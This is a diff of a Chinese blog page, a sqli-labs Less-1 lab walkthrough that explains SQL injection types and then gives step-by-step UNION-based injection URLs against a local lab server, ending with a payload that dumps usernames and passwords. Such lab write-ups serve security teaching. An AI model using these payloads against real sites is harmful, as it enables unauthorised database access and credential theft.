@@ -4,8 +4,8 @@
 
 <head><meta name="generator" content="Hexo 3.9.0">
     <meta charset="utf-8">
-    <meta name="keywords" content="Less1, Junk Blog">
-    <meta name="description" content="SQL注入简介SQL注入英文名叫 SQL Injection，是发生于应用程序与数据库层的安全漏洞。简单来说，就是在输入的字符串中注入 SQL 命令，如果程序忽略了字符检查，那么这些注入进去的恶意软件就会被数据库误认为事正常的 SQL 命令">
+    <meta name="keywords" content="sqli-labs-Less1, Junk Blog">
+    <meta name="description" content="SQL注入简介什么是SQL注入？SQL 注入英文名叫 SQL Injection，是发生于应用程序与数据库层的安全漏洞。简单来说，就是在输入的字符串中注入 SQL 命令，如果程序忽略了字符检查，那么这些注入进去的恶意软件就会被数据库误认为是">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -13,7 +13,7 @@
     <meta name="format-detection" content="telephone=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <title>Less1 | Junk Blog</title>
+    <title>sqli-labs-Less1 | Junk Blog</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/font-awesome.min.css">
@@ -282,13 +282,13 @@
 
 
 
-<div class="bg-cover post-cover" style="background-image: url('/medias/featureimages/0.jpg')">
+<div class="bg-cover post-cover" style="background-image: url('https://i.loli.net/2019/10/10/FExp39OTr1yJA6f.png')">
     <div class="container">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
                     <div class="description center-align post-title">
-                        Less1
+                        sqli-labs-Less1
                     </div>
                 </div>
             </div>
@@ -415,14 +415,14 @@
                     
                     <div class="info-break-policy">
                         <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                        754
+                        1.5k
                     </div>
                     
 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                        3 分
+                        6 分
                     </div>
                     
                 
@@ -438,58 +438,110 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h3 id="SQL注入简介"><a href="#SQL注入简介" class="headerlink" title="SQL注入简介"></a>SQL注入简介</h3><p>SQL注入英文名叫 SQL Injection，是发生于应用程序与数据库层的安全漏洞。简单来说，就是在输入的字符串中注入 SQL 命令，如果程序忽略了字符检查，那么这些注入进去的恶意软件就会被数据库误认为事正常的 SQL 命令来运行。</p>
-<h3 id="SQL注入原理"><a href="#SQL注入原理" class="headerlink" title="SQL注入原理"></a>SQL注入原理</h3><p><img src="https://i.loli.net/2019/09/12/wRNZ32vybPloCUe.png" alt="less-1.png"></p>
+                <h1 id="SQL注入简介"><a href="#SQL注入简介" class="headerlink" title="SQL注入简介"></a>SQL注入简介</h1><h2 id="什么是SQL注入？"><a href="#什么是SQL注入？" class="headerlink" title="什么是SQL注入？"></a>什么是SQL注入？</h2><p>SQL 注入英文名叫 SQL Injection，是发生于应用程序与数据库层的安全漏洞。简单来说，就是在输入的字符串中注入 SQL 命令，如果程序忽略了字符检查，那么这些注入进去的恶意软件就会被数据库误认为是正常的 SQL 命令来运行。</p>
+<p><img src="https://i.loli.net/2019/10/10/jNa3tZQyVJgDIHn.png" alt="less-1-1.png"></p>
+<h2 id="SQL-注入的类型"><a href="#SQL-注入的类型" class="headerlink" title="SQL 注入的类型"></a>SQL 注入的类型</h2><h3 id="按照注入点类型来分类"><a href="#按照注入点类型来分类" class="headerlink" title="按照注入点类型来分类"></a>按照注入点类型来分类</h3><ul>
+<li><p>数字型注入点<br>许多网页链接有类似的结构 <code>http://xxx.com/users.php?id=1</code> 基于此种形式的注入，一般被叫做数字型注入点，缘由是其注入点 id 类型为数字，在大多数的网页中，诸如 查看用户个人信息，查看文章等，大都会使用这种形式的结构传递 id 等信息，交给后端，查询出数据库中对应的信息，返回给前台。这一类的 SQL 语句原型大概为 <code>select * from 表名 where id=1</code></p>
+</li>
+<li><p>字符型注入点<br>网页链接有类似的结构 <code>http://xxx.com/users.php?name=admin</code> 这种形式，其注入点 name 类型为字符类型，所以叫字符型注入点。这一类的 SQL 语句原型大概为 <code>select * from 表名 where name='admin'</code></p>
+</li>
+<li><p>搜索型注入点<br>这是一类特殊的注入类型。这类注入主要是指在进行数据搜索时没过滤搜索参数，一般在链接地址中有 <code>keyword=关键字</code> 有的不显示在的链接地址里面，而是直接通过搜索框表单提交。此类注入点提交的 SQL 语句，其原形大致为：<code>select * from 表名 where 字段 like '%关键字%'</code></p>
+</li>
+</ul>
+<h3 id="按照数据提交的方式来分类"><a href="#按照数据提交的方式来分类" class="headerlink" title="按照数据提交的方式来分类"></a>按照数据提交的方式来分类</h3><ul>
+<li><p>GET 注入<br>提交数据的方式是 GET , 注入点的位置在 GET 参数部分。比如有这样的一个链接<code>http://xxx.com/news.php?id=1</code>, id 是注入点。</p>
+</li>
+<li><p>POST 注入<br>使用 POST 方式提交数据，注入点位置在 POST 数据部分，常发生在表单中。</p>
+</li>
+<li><p>Cookie 注入<br>HTTP 请求的时候会带上客户端的 Cookie, 注入点存在 Cookie 当中的某个字段中。</p>
+</li>
+<li><p>HTTP 头部注入<br>注入点在 HTTP 请求头部的某个字段中。比如存在 User-Agent 字段中。严格讲的话，Cookie 其实应该也是算头部注入的一种形式。因为在 HTTP 请求的时候，Cookie 是头部的一个字段。</p>
+</li>
+</ul>
+<h3 id="按照执行效果来分类"><a href="#按照执行效果来分类" class="headerlink" title="按照执行效果来分类"></a>按照执行效果来分类</h3><ul>
+<li><p>基于布尔的盲注<br>即可以根据返回页面判断条件真假的注入。</p>
+</li>
+<li><p>基于时间的盲注<br>即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。</p>
+</li>
+<li><p>基于报错注入<br>即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。</p>
+</li>
+<li><p>联合查询注入<br>可以使用union的情况下的注入。</p>
+</li>
+<li><p>堆查询注入<br>可以同时执行多条语句的执行时的注入。</p>
+</li>
+<li><p>宽字节注入<br>宽字节注入源于程序员设置 MySQL 连接时错误配置为：set character_set_client=gbk，这样配置会引发编码转换从而导致的注入漏洞。</p>
+</li>
+</ul>
+<h2 id="SQL注入原理"><a href="#SQL注入原理" class="headerlink" title="SQL注入原理"></a>SQL注入原理</h2><p><img src="https://i.loli.net/2019/09/12/wRNZ32vybPloCUe.png" alt="less-1.png"></p>
 <p>当我输入上面的 URL 时，浏览器就会发送 sql 命令</p>
 <pre class=" language-mysql"><code class="language-mysql">select * from TABLE where id='1' limit 0,1;</code></pre>
 <p>给服务器，之后服务器会将结果传输给浏览器，最后浏览器将数据展示页到面上给用户看。</p>
 <p><img src="https://i.loli.net/2019/09/12/JYhq5CG6jgbOkwV.png" alt="less-2.png"></p>
 <p>之后通过修改 URL，达到服务器执行插入的 SQL 命令，并返回到页面上。这里浏览器发送sql命令是：</p>
 <pre class=" language-mysql"><code class="language-mysql">select * from TABLE where id='-1' union select 1,database(),2;--+' limit 0,1;</code></pre>
-<h3 id="Less-1（GET-型基于错误的单引号字符型注入）"><a href="#Less-1（GET-型基于错误的单引号字符型注入）" class="headerlink" title="Less-1（GET 型基于错误的单引号字符型注入）"></a>Less-1（GET 型基于错误的单引号字符型注入）</h3><ol>
+<h1 id="注入步骤"><a href="#注入步骤" class="headerlink" title="注入步骤"></a>注入步骤</h1><h2 id="Less-1（GET-型基于错误的单引号字符型注入）"><a href="#Less-1（GET-型基于错误的单引号字符型注入）" class="headerlink" title="Less-1（GET 型基于错误的单引号字符型注入）"></a>Less-1（GET 型基于错误的单引号字符型注入）</h2><ol>
 <li><strong>GET 方式提交 id</strong></li>
 </ol>
 <pre><code>http://192.168.150.128/sqli-labs-master/Less-1/?id=1</code></pre><p><img src="https://i.loli.net/2019/09/13/QEuwBkNStycYWp9.png" alt="less-3.png"></p>
 <ol start="2">
 <li><strong>添加 “单引号” 报错，爆出数据库软件名称和部分 SQL 语句</strong></li>
 </ol>
-<pre><code>http://192.168.150.128/sqli-labs-master/Less-1/?id=1&#39;</code></pre><p><img src="https://i.loli.net/2019/09/13/qfNOhSmYiIuojr9.png" alt="less-4.png"></p>
+<pre><code>http://192.168.150.128/sqli-labs-master/Less-1/?id=1'</code></pre><p><img src="https://i.loli.net/2019/09/13/qfNOhSmYiIuojr9.png" alt="less-4.png"></p>
 <p>从 <font color="red">‘1’’ LIMIT 0,1</font>的报错信息中可以判断出后台执行的 sql 语句：select * from TABLE where id=’1’ limit 0,1;</p>
 <ol start="3">
 <li><strong>order by 猜测字段数</strong></li>
 </ol>
-<pre><code>http://192.168.150.128/sqli-labs-master/Less-1/?id=1&#39; order by 1%23
+<pre><code>http://192.168.150.128/sqli-labs-master/Less-1/?id=1' order by 1%23
 ......
-http://192.168.150.128/sqli-labs-master/Less-1/?id=1&#39; order by 4%23 </code></pre><p><img src="https://i.loli.net/2019/09/14/5xpfnLvgQbMo2GY.png" alt="less-5.png"></p>
-<p>order by 4  时页面报错，判断 TABLE 字段数为3。<br>这里的 %23 表示的是 “#” 符号，用来注释后面的语句。字符 “#” 浏览器不会编码，需要手动编码 %23</p>
+http://192.168.150.128/sqli-labs-master/Less-1/?id=1' order by 4%23 </code></pre><p><img src="https://i.loli.net/2019/09/14/5xpfnLvgQbMo2GY.png" alt="less-5.png"></p>
+<p><strong>PS：</strong><br>order by 4  时页面报错，判断 TABLE 字段数为3。<br>这里的 %23 表示的是 “#” 符号，用来注释后面的语句。字符 “#” 浏览器不会编码，需要手动编码 %23</p>
 <ol start="4">
 <li><strong>查看字段显示位置</strong></li>
 </ol>
-<pre><code>http://192.168.150.128/sqli-labs-master/Less-1/?id=-1&#39; union select 1,2,3%23</code></pre><p><img src="https://i.loli.net/2019/09/14/1uhvRM2CylzDiNE.png" alt="less-6.png"></p>
-<p><strong>PS：</strong><br>    union 之前的语句必须返回空值，因为 mysql_fetch_array 函数 只能获取一条信息。也就是说：整个 SQL 语句中，只能返回一个 SQL 执行结果。</p>
+<pre><code>http://192.168.150.128/sqli-labs-master/Less-1/?id=-1' union select 1,2,3%23</code></pre><p><img src="https://i.loli.net/2019/09/14/1uhvRM2CylzDiNE.png" alt="less-6.png"></p>
+<p><strong>PS：</strong><br>union 之前的语句必须返回空值，因为 mysql_fetch_array() 函数 只能获取一条信息。也就是说：整个 SQL 语句中，只能返回一个 SQL 执行结果。</p>
 <ol start="5">
 <li><strong>获取数据库登录用户、数据库名</strong></li>
 </ol>
-<pre><code>http://192.168.150.128/sqli-labs-master/Less-1/?id=-1&#39; union select 1,user(),database()%23</code></pre><p><img src="https://i.loli.net/2019/09/14/ckphjUCl9RsW3wM.png" alt="less-07.png"></p>
-<p>user()：获取当前登录的数据库用户<br>database()：获取数据库名称6</p>
+<pre><code>http://192.168.150.128/sqli-labs-master/Less-1/?id=-1' union select 1,user(),database()%23</code></pre><p><img src="https://i.loli.net/2019/09/14/ckphjUCl9RsW3wM.png" alt="less-07.png"></p>
+<p><strong>PS：</strong><br>user()：获取当前登录的数据库用户<br>database()：获取数据库名称6</p>
 <ol start="6">
 <li><strong>爆表</strong></li>
 </ol>
-<pre><code>http://192.168.150.128/sqli-labs-master/Less-1/?id=-1&#39; UNION SELECT 1,group_concat(table_name),3 FROM information_schema.TABLES WHERE TABLE_SCHEMA=&#39;security&#39;%23</code></pre><p><img src="https://i.loli.net/2019/09/14/CRAPlKj9MOSth7u.png" alt="less-8.png"></p>
+<pre><code>http://192.168.150.128/sqli-labs-master/Less-1/?id=-1' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.TABLES WHERE TABLE_SCHEMA='security'%23</code></pre><p><img src="https://i.loli.net/2019/09/14/CRAPlKj9MOSth7u.png" alt="less-8.png"></p>
 <p><strong>PS：</strong><br>group_concat()  函数可以让查询获得的数据组成一行显示。</p>
 <p>在 MySQL 中，把 information_schema 是信息数据库。其中保存着关于 MySQL 服务器所维护的所有其他数据库的信息。如数据库名，数据库的表，表栏的数据类型与访问权 限等。</p>
 <ol start="7">
 <li><strong>爆表中的字段</strong></li>
 </ol>
-<pre><code>http://192.168.150.128/sqli-labs-master/Less-1/?id=-1&#39; UNION SELECT 1,2,group_concat(column_name) FROM information_schema.COLUMNS WHERE TABLE_SCHEMA=&#39;security&#39; AND TABLE_NAME=&#39;users&#39;%23</code></pre><p><img src="https://i.loli.net/2019/09/14/lqsM6SErwChAzHe.png" alt="less-9.png"></p>
+<pre><code>http://192.168.150.128/sqli-labs-master/Less-1/?id=-1' UNION SELECT 1,2,group_concat(column_name) FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='security' AND TABLE_NAME='users'%23</code></pre><p><img src="https://i.loli.net/2019/09/14/lqsM6SErwChAzHe.png" alt="less-9.png"></p>
 <ol start="8">
 <li><strong>爆数据</strong></li>
 </ol>
-<pre><code>http://192.168.150.128/sqli-labs-master/Less-1/?id=-1&#39; UNION SELECT 1,group_concat(username),group_concat(password) FROM security.users %23</code></pre><p><img src="https://i.loli.net/2019/09/14/D1i9J2FrnAedRSk.png" alt="less-10.png"></p>
-<h3 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h3><p><a href="https://www.cnblogs.com/omnis/p/8311556.html" target="_blank" rel="noopener">【sqli-labs】 less1 GET - Error based - Single quotes - String(GET型基于错误的单引号字符型注入)</a></p>
+<pre><code>http://192.168.150.128/sqli-labs-master/Less-1/?id=-1' UNION SELECT 1,group_concat(username),group_concat(password) FROM security.users %23</code></pre><p><img src="https://i.loli.net/2019/09/14/D1i9J2FrnAedRSk.png" alt="less-10.png"></p>
+<h1 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h1><p><a href="https://www.cnblogs.com/omnis/p/8311556.html" target="_blank" rel="noopener">【sqli-labs】 less1 GET - Error based - Single quotes - String(GET型基于错误的单引号字符型注入)</a></p>
 <p><a href="https://blog.csdn.net/sdb5858874/article/details/80656123" target="_blank" rel="noopener">SQL注入——联合查询和报错注入</a></p>
 <p><a href="https://www.jianshu.com/p/5903e8c002ed" target="_blank" rel="noopener">MYSQL中information_schema简介</a></p>
-
+<p><a href="https://www.cnblogs.com/xuthus/p/9450805.html" target="_blank" rel="noopener">SQL注入 (1) SQL注入类型介绍</a></p>
+<script>
+        document.querySelectorAll('.github-emoji')
+          .forEach(el => {
+            if (!el.dataset.src) { return; }
+            const img = document.createElement('img');
+            img.style = 'display:none !important;';
+            img.src = el.dataset.src;
+            img.addEventListener('error', () => {
+              img.remove();
+              el.style.color = 'inherit';
+              el.style.backgroundImage = 'none';
+              el.style.background = 'none';
+            });
+            img.addEventListener('load', () => {
+              img.remove();
+            });
+            document.body.appendChild(img);
+          });
+      </script>
             </div>
             <hr/>
 
@@ -510,9 +562,9 @@ http://192.168.150.128/sqli-labs-master/Less-1/?id=1&#39; order by 4%23 </code><
                     <span class="reprint-tip">
                         <i class="fa fa-exclamation-circle"></i>&nbsp;&nbsp;转载请注明:
                     </span>
-                    <a href="http://yoursite.com" class="b-link-green">Junk Blog</a>
+                    <a href="https://github.com/hhkk2334/hhkk2334.github.io" class="b-link-green">Junk Blog</a>
                     <i class="fa fa-angle-right fa-lg fa-fw text-color"></i>
-                    <a href="/2019/09/10/sqli-labs Less1/" class="b-link-green">Less1</a>
+                    <a href="/2019/09/10/sqli-labs Less1/" class="b-link-green">sqli-labs-Less1</a>
                 </p>
             </div>
         </div>
@@ -540,10 +592,9 @@ http://192.168.150.128/sqli-labs-master/Less-1/?id=1&#39; order by 4%23 </code><
                 <a href="/2019/09/15/sqli-labs Less2/">
                     <div class="card-image">
                         
+                        <img src="https://i.loli.net/2019/10/10/ZbcKnLTFoV6Ydx5.png" class="responsive-img" alt="sqli-labs-Less2">
                         
-                        <img src="/medias/featureimages/1.jpg" class="responsive-img" alt="Less2">
-                        
-                        <span class="card-title">Less2</span>
+                        <span class="card-title">sqli-labs-Less2</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -676,7 +727,7 @@ http://192.168.150.128/sqli-labs-master/Less-2/?id=1
         var url = document.location.href;
         newdiv.innerHTML += '<br />'
             + '来源: Junk Blog<br />'
-            + '作者: Trash Can<br />'
+            + '作者: Trash Can,Trash Can<br />'
             + '链接: <a href="' + url + '">' + url + '</a><br />'
             + '本文章著作权归作者所有，任何形式的转载都请注明出处。';
 
@@ -739,16 +790,8 @@ http://192.168.150.128/sqli-labs-master/Less-2/?id=1
 
 <footer class="page-footer bg-color">
     <div class="container row center-align">
-        <div class="col s12 m8 l8 copy-right">
-            本站由&copy;<a href="https://blinkfox.github.io/" target="_blank">Blinkfox</a>基于
-            <a href="https://hexo.io/" target="_blank">Hexo</a> 的
-            <a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">hexo-theme-matery</a>主题搭建.
-
-            
-                &nbsp;<i class="fa fa-area-chart"></i>&nbsp;站点总字数:&nbsp;
-                <span class="white-color">16.1k</span>
-            
-
+        <div class="col s12 m8 l8 copy-right" >
+    
             
 			
                 <br>
@@ -766,25 +809,6 @@ http://192.168.150.128/sqli-labs-master/Less-2/?id=1
                 
             
         </div>
-        <div class="col s12 m4 l4 social-link social-statis">
-    <a href="https://github.com/hhkk2334/hhkk2334.github.io" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
-        <i class="fa fa-github"></i>
-    </a>
-
-
-
-    <a href="http://mail.qq.com/cgi-bin/qm_share?t=qm_mailme&email=RHZxdXFydXJ9dHEENTVqJysp" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
-        <i class="fa fa-envelope-open"></i>
-    </a>
-
-
-
-    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=2515616905" class="tooltipped" data-tooltip="QQ联系我: 2515616905" data-position="top" data-delay="50">
-        <i class="fa fa-qq"></i>
-    </a>
-
-
-</div>
     </div>
 </footer>
 
